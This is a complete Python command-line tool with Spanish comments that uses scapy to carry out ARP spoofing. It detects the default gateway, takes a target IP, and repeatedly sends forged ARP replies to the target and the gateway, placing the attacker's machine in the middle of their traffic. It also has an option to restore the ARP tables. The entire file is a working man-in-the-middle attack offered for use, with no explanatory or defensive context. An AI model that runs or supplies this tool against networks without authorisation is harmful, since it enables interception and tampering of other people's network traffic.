#!/usr/bin/env python3
import os
import re
import threading
from scapy.all import ARP, Ether, send, srp
import time
import uuid

# Obtener automáticamente la puerta de enlace predeterminada
def obtener_puerta_enlace():
    try:
        resultado = os.popen("ip route show").read()
        match = re.search(r'default via ([\d\.]+)', resultado)
        if match:
            return match.group(1)
        else:
            raise ValueError("No se pudo encontrar la puerta de enlace predeterminada.")
    except Exception as e:
        print(f"Error al obtener la puerta de enlace: {e}")
        return None

# Variables Globales
ip_puerta_enlace = obtener_puerta_enlace()
mac_atacante = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8*6, 8)][::-1])
ataque_en_curso = False

def obtener_mac(ip):
    solicitud_arp = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    paquete = ether / solicitud_arp
    resultado = srp(paquete, timeout=2, verbose=0)[0]
    for enviado, recibido in resultado:
        return recibido.hwsrc

def spoofing_arp(ip_objetivo):
    global ataque_en_curso
    mac_objetivo = obtener_mac(ip_objetivo)
    if not mac_objetivo:
        print(f"No se pudo obtener la dirección MAC del objetivo {ip_objetivo}.")
        return

    print(f"Dirección MAC del objetivo {ip_objetivo}: {mac_objetivo}")
    
    try:
        respuesta_arp_objetivo = ARP(pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_puerta_enlace, hwsrc=mac_atacante, op=2)
        respuesta_arp_puerta = ARP(pdst=ip_puerta_enlace, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_objetivo, hwsrc=mac_atacante, op=2)

        while ataque_en_curso:
            send(respuesta_arp_objetivo, verbose=0)
            send(respuesta_arp_puerta, verbose=0)
            print(f"Enviando ARP spoofing a {ip_objetivo}...")
            time.sleep(2)
    except Exception as e:
        print(f"Ocurrió un error: {e}")
        restaurar_conexion(ip_objetivo)

def restaurar_conexion(ip_objetivo):
    mac_objetivo = obtener_mac(ip_objetivo)
    mac_puerta = obtener_mac(ip_puerta_enlace)

    if mac_objetivo and mac_puerta:
        respuesta_arp_objetivo = ARP(pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_puerta_enlace, hwsrc=mac_puerta, op=2)
        respuesta_arp_puerta = ARP(pdst=ip_puerta_enlace, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_objetivo, hwsrc=mac_objetivo, op=2)

        send(respuesta_arp_objetivo, count=5, verbose=0)
        send(respuesta_arp_puerta, count=5, verbose=0)
        print("Conexión restaurada.")
    else:
        print("No se pudo restaurar la conexión: no se pudieron obtener direcciones MAC.")

def iniciar_spoofing(ip_objetivo):
    global ataque_en_curso
    if ip_objetivo:
        ataque_en_curso = True  
        hilo = threading.Thread(target=spoofing_arp, args=(ip_objetivo,), daemon=True)
        hilo.start()

def detener_spoofing():
    global ataque_en_curso
    ataque_en_curso = False  
    print("Ataque cancelado.\n")

# CLI principal
def main():
    if not ip_puerta_enlace:
        print("Error: No se pudo determinar la puerta de enlace predeterminada.")
        return

    print(f"Herramienta de ARP Spoofing\nPuerta de enlace predeterminada: {ip_puerta_enlace}")

    # Solicitar la IP objetivo
    ip_objetivo = input("Ingrese la IP objetivo: ")

    # Iniciar ARP Spoofing automáticamente después de ingresar la IP
    iniciar_spoofing(ip_objetivo)

    # Esperar al usuario para cancelar el ataque o salir
    try:
        while True:
            comando = input("\nPresione 'c' para cancelar el ataque o 's' para salir: ").lower()
            if comando == 'c':
                detener_spoofing()
            elif comando == 's':
                if ataque_en_curso:
                    detener_spoofing()
                print("Saliendo del programa.")
                break
            else:
                print("Comando no reconocido. Intente de nuevo.")
    except KeyboardInterrupt:
        # Manejo para CTRL+C
        if ataque_en_curso:
            detener_spoofing()
        print("\nSaliendo del programa.")

if __name__ == "__main__":
    main()
